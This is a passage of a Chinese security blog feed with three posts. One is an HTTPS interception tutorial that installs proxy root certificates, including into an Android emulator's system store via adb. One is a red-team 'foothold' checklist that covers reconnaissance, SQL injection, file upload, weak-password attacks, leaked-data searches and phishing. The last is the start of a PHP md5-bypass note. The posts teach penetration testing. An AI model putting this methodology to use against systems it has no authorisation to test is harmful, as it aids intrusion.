      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>抓包很常见，以前做开发的时候也经常用</p><p>无论是<code>charles</code>还是<code>finddler</code>等等</p><p>你是否遇到过<code>https</code>一篇红和<code>unkown</code>的情况？</p><p>2024年了，都是<code>https</code>了把，<code>http</code>屈指可数</p><p>那么我们如何抓包<code>https</code>呢</p><h1 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h1><p>其实说白了，证书才是关键</p><p>我们抓包的本质，是将网络请求代理到某个软件上</p><p>换句话说，自己当“中间人”</p><p>那么我们就需要安装这个代理软件的证书了</p><h1 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h1><h2 id="1-本机PC安装证书"><a href="#1-本机PC安装证书" class="headerlink" title="1.本机PC安装证书"></a>1.本机PC安装证书</h2><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517110923.png" alt="本机证书安装1"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517133613.png" alt="本地证书安装2"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517133654.png" alt="本地证书安装3"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517133728.png" alt="本地证书安装4"></p><p>这样就安装完毕了</p><h2 id="2-浏览器安装根证书"><a href="#2-浏览器安装根证书" class="headerlink" title="2.浏览器安装根证书"></a>2.浏览器安装根证书</h2><p>基本上看到这篇文章的，用的应该不是Edge就是Chrome</p><p>我们以Edge为例，其他浏览器自行搜索</p><p>打开浏览器设置</p><p>搜索证书</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517133936.png" alt="浏览器证书"></p><p>我们可以发现有个证书管理</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517134038.png" alt="证书导入"></p><p>很显然，我们需要导入证书到受信任的CA里</p><p>这会儿我们的<code>Charles</code>就可以正常抓https了</p><h2 id="3-安卓手机安装证书（安卓7以上）"><a href="#3-安卓手机安装证书（安卓7以上）" class="headerlink" title="3.安卓手机安装证书（安卓7以上）"></a>3.安卓手机安装证书（安卓7以上）</h2><p>下载证书<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517135128.png"></p><p>下载以后<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517111129.png"></p><p>大伙肯定都知道，安卓7以上，不让把证书安装到受信任的证书里</p><p>那么我要是非要放进去呢</p><p><a href="https://blog.lv5.moe/p/solutions-to-certificate-invalidation-after-android-7">Android 7.0 之后抓包 unknown 和证书无效的解决方案</a></p><p>这里摘抄一下大哥说的话</p><blockquote><p>将抓包软件的证书安装成系统证书（需 ROOT）<br>系统证书目录：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</p><p>其中的每个证书的命名规则如下：<br><Certificate_Hash>.<Number><br>文件名是一个 Hash 值，而后缀是一个数字。</Number></Certificate_Hash></p><p>文件名可以用下面的命令计算出来：</p><p>openssl x509 -subject_hash_old -in <Certificate_File></Certificate_File></p><p>后缀名的数字是为了防止文件名冲突的，比如如果两个证书算出的 Hash 值是一样的话，那么一个证书的后缀名数字可以设置成 0，而另一个证书的后缀名数字可以设置成 1</p></blockquote><p>Windows用户<code>openssl</code>这个命令没有的话，用<code>git bash</code>就可以了</p><p>在座的么有不会用<code>git</code>的人吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -in charles-proxy-ssl-proxying-certificate.pem </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517135251.png" alt="hash"></p><p>那接下来直接把<code>charles-proxy-ssl-proxying-certificate.pem</code>改名为<code>7515195b.0</code></p><p>然后把<code>7515195b.0</code>移到安卓设备<code>/system/etc/security/cacerts/</code>里</p><p>那这里有人会问了，我手上的安卓没有Root，咋整呢</p><p>呐呐呐，我就知道有人会问了</p><p>所以这里又有两种方案</p><h3 id="3-1-安卓模拟器（亲测有效）"><a href="#3-1-安卓模拟器（亲测有效）" class="headerlink" title="3.1 安卓模拟器（亲测有效）"></a>3.1 安卓模拟器（亲测有效）</h3><p>这里我们不得不又说明一下借鉴自哪里</p><p><a href="https://www.cnblogs.com/macliu/p/11379480.html">使用charls抓包微信小程序的解决方案（终极解决，各种坑不怕，亲测可用，不服来战！）</a></p><p>没错，使用安卓模拟器，我也和这位博主一样，要抓小程序</p><p>所以我也使用了夜神模拟器（等我有影响力了，麻烦夜神给我打钱）</p><p>不过要注意，使用它的安卓7版本即可，12版本亲测没有root，9版本未测试</p><p>接着我们把上述的手机端的hash命名文件，放到对应目录下</p><p>即把<code>7515195b.0</code>移到安卓设备<code>/system/etc/security/cacerts/</code>里</p><p>这时候你会发现。嘻嘻，还是不能抓包</p><p>原因是模拟器的根证书里并没有出现根证书</p><p>这里告诉一下大家证书名，免得不好找<code>XK72 Ltd</code></p><p>其实根本原因是，证书的权限不对</p><p>那么接下来，告诉大家怎么去修改权限</p><h4 id="3-1-1-adb链接模拟器"><a href="#3-1-1-adb链接模拟器" class="headerlink" title="3.1.1 adb链接模拟器"></a>3.1.1 adb链接模拟器</h4><p>找到模拟器的安装目录</p><p>里头有个<code>bin</code>目录，目录下有个<code>nox_adb.exe</code></p><p>例如<code>D:\Safety\Nox\bin\nox_adb.exe</code></p><p>在这里打开cmd，并使用<code>nox_adb.exe devices</code>查看模拟器是否连接上了adb</p><p>如果没连接上，重启模拟器即可</p><h4 id="3-1-2-给证书文件添加权限"><a href="#3-1-2-给证书文件添加权限" class="headerlink" title="3.1.2 给证书文件添加权限"></a>3.1.2 给证书文件添加权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nox_adb devices</span><br><span class="line"></span><br><span class="line">adb connect 127.0.0.1:62025</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后面这个hash.number改成自己的，别光顾着复制粘贴了</span></span><br><span class="line">adb shell &quot;chmod 664 /system/etc/security/cacerts/7515195b.0&quot;</span><br></pre></td></tr></table></figure><p>如果<code>chmod</code>执行报错<code>Read-only file system</code>，那执行下面的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">mount -o remount -o rw /system</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再执行一次</span></span><br><span class="line">adb shell &quot;chmod 664 /system/etc/security/cacerts/7515195b.0&quot;</span><br><span class="line"></span><br><span class="line">adb reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这下应该会重启模拟器，重启完，模拟器配代理，欧了~</p><p>你的小<code>Charles</code>应该就能抓<code>https</code>了</p><h3 id="3-2-安卓上的虚拟机搭配xposed（思路，未测试）"><a href="#3-2-安卓上的虚拟机搭配xposed（思路，未测试）" class="headerlink" title="3.2 安卓上的虚拟机搭配xposed（思路，未测试）"></a>3.2 安卓上的虚拟机搭配xposed（思路，未测试）</h3><p>给个思路</p><p><a href="https://cloud.tencent.com/developer/article/1013145">无需 Root 也能使用 Xposed！</a></p><p>搭配</p><p><a href="https://github.com/Fuzion24/JustTrustMe">JustTrustMe</a></p><p>开始你的真机https抓包吧</p><h2 id="4-补一个设置https"><a href="#4-补一个设置https" class="headerlink" title="4.补一个设置https"></a>4.补一个设置https</h2><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517142217.png"></p><p>填两个*就好了</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517142255.png"></p><h1 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h1><p>其实是一样的</p><p>先找到自己的代理端口</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517141631.png"></p><p>使用内置浏览器打开并访问该端口</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517141717.png"></p><p>点击下载证书</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F1/20240517141743.png"></p><p>你会下到一张<code>der</code>证书</p><p>我们只需要把他变成<code>pem</code>格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -outform PEM -text -in cacert.der -out cacert.pem</span><br></pre></td></tr></table></figure><p>其他一切同上</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的渗透之旅速成篇（二）-打点</title>
      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</link>
      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</guid>
      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;p&gt;阿星还是个新人&lt;/p&gt;
&lt;p&gt;不知道正确的渗透步骤是什么&lt;/p&gt;
&lt;p&gt;这里看到一个打点步骤&lt;/p&gt;
&lt;p&gt;遂记录下来&lt;/p&gt;
&lt;h1 id=&quot;打点的基本方法&quot;&gt;&lt;a href=&quot;#打点的基本方法&quot; class=&quot;headerlink&quot; title=&quot;打点的基本方法&quot;&gt;&lt;/a&gt;打点的基本方法&lt;/h1&gt;&lt;p&gt;基本方法，无非就是信息搜集–&amp;gt;找到脆弱资产–&amp;gt;漏洞利用→getshell，说起来是很简单的。&lt;/p&gt;
&lt;p&gt;这其中最肝的一个部分，莫过于信息搜集了，纯体力活。&lt;/p&gt;
&lt;p&gt;当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。&lt;/p&gt;
&lt;p&gt;虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。&lt;/p&gt;
&lt;p&gt;1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>阿星还是个新人</p><p>不知道正确的渗透步骤是什么</p><p>这里看到一个打点步骤</p><p>遂记录下来</p><h1 id="打点的基本方法"><a href="#打点的基本方法" class="headerlink" title="打点的基本方法"></a>打点的基本方法</h1><p>基本方法，无非就是信息搜集–&gt;找到脆弱资产–&gt;漏洞利用→getshell，说起来是很简单的。</p><p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p><p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p><p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p><p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p><p>2、拿到这堆公司和子公司的名字→oneforall来跑一遍→然后得到了一堆子域名</p><p>3、拿到这堆子域名丢给Eeyes跑一遍→得到对应子域名对应的ip和c段信息</p><p>4、将对应ip和c段丢给fofa和fscan→fofa能快速得到c段资产信息，fscan能快速扫一遍，顺便帮你打一下常用漏洞</p><p>5、如果你的运气足够好，这个时候fscan已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第6步</p><p>6、刚刚fofa得到的资产看一眼，这里可以配合ehole的指纹识别来帮助快速筛选，通过筛选敏感资产，例如shiro，fastjson等直接能够反序列化getshell的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第7步</p><p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤8继续吧</p><p>8、其实经过上面的一番筛选，web这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤9吧</p><p>9、web的过完了，虽然没有直接能够rce的系统，但是我们获得了很多形形色色的登录后台\用户登录\注册\管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p><p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的shell就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是shiro的时代已经渐渐过去了。</p><p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个shell（没路径连不上但是确实是shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p><p>三板斧其三 sql注入：这个更加老熟人了，注入之后，低权限，直接gg，高权限，试试吧，看能不能上shell。</p><p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p><p>10、对各种登录系统尝试弱口令&#x2F;sql注入攻击，弱口令能登进去后台就找上传点，sql注入建议xray+burp来测，看到有戏的再上sqlmap。</p><p>还有一些信息搜集的方法，比如fofa搜关键字，title&#x3D;”单位名”等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p><p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi等）然后拿shell的，这种属于天赐shell，不在常规考虑范围之内，但也可以尝试。</p><p>11、弱口令如果爆不出账号密码，就考虑上网盘\github\sgk\泄露公开库搜对应人员的信息，看看好使不</p><p>12、如果还是没有用，就可以开始看公众号\app\小程序的信息</p><p>13、如果还是没有用，就要开始用域传送\备案号\ip反查网站\ssl证书\用google来搜c段</p><p>14、如果还是没有用，就用dirmap\dirsearch来对可疑的网站进行目录爆破，看看好使不</p><p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p><p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p><p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项checklist不断的去尝试而已。</p><p>因此通常意义上的快速打点，就是比谁先试完所有的checklist，虽然目前绝大部分工作都是由工具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p><p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p><p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的安全之旅（七）——md5绕过</title>
      <link>http://blog.xingxiaowu.cn/2024/04/17/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94md5%E7%BB%95%E8%BF%87/</link>
      <guid>http://blog.xingxiaowu.cn/2024/04/17/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94md5%E7%BB%95%E8%BF%87/</guid>
      <pubDate>Wed, 17 Apr 2024 12:17:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;md5绕过&quot;&gt;&lt;a href=&quot;#md5绕过&quot; class=&quot;headerlink&quot; title=&quot;md5绕过&quot;&gt;&lt;/a&gt;md5绕过&lt;/h1&gt;&lt;p&gt;&lt;code&gt;php&lt;/code&gt;的代码审计总有这种比较，记录一下&lt;/p&gt;
&lt;h1 id=&quot;php中的强弱比较（和js挺像的）&quot;&gt;&lt;a href=&quot;#php中的强弱比较（和js挺像的）&quot; class=&quot;headerlink&quot; title=&quot;php中的强弱比较（和js挺像的）&quot;&gt;&lt;/a&gt;php中的强弱比较（和js挺像的）&lt;/h1&gt;&lt;h2 id=&quot;强比较&quot;&gt;&lt;a href=&quot;#强比较&quot; class=&quot;headerlink&quot; title=&quot;强比较&quot;&gt;&lt;/a&gt;强比较&lt;/h2&gt;&lt;p&gt;强比较（全等比较符&amp;#x3D;&amp;#x3D;&amp;#x3D;）：强比较要求比较的两个值不仅是值相等，而且类型也必须相等。只有当值和类型都相等时，才会返回 true。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$b&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt; === &lt;span class=&quot;variable&quot;&gt;$b&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;相等&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 输出这行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;不相等&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;php中的弱比较&quot;&gt;&lt;a href=&quot;#php中的弱比较&quot; class=&quot;headerlink&quot; title=&quot;php中的弱比较&quot;&gt;&lt;/a&gt;php中的弱比较&lt;/h2&gt;&lt;p&gt;弱比较（相等比较符&amp;#x3D;&amp;#x3D;）：弱比较只要求比较的两个值在转换类型后相等即可。如果两个值的类型不同，会尝试将其中一个值转换为另一个值的类型。例如：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$b&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt; == &lt;span class=&quot;variable&quot;&gt;$b&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//输出这行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;相等&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;不相等&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述代码中，比较结果相等，由于 $b 是字符串类型，因此 $a 将被自动转换为字符串类型后再进行比较。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h1><p><code>php</code>的代码审计总有这种比较，记录一下</p><h1 id="php中的强弱比较（和js挺像的）"><a href="#php中的强弱比较（和js挺像的）" class="headerlink" title="php中的强弱比较（和js挺像的）"></a>php中的强弱比较（和js挺像的）</h1><h2 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h2><p>强比较（全等比较符&#x3D;&#x3D;&#x3D;）：强比较要求比较的两个值不仅是值相等，而且类型也必须相等。只有当值和类型都相等时，才会返回 true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> === <span class="variable">$b</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;相等&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 输出这行</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;不相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php中的弱比较"><a href="#php中的弱比较" class="headerlink" title="php中的弱比较"></a>php中的弱比较</h2><p>弱比较（相等比较符&#x3D;&#x3D;）：弱比较只要求比较的两个值在转换类型后相等即可。如果两个值的类型不同，会尝试将其中一个值转换为另一个值的类型。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 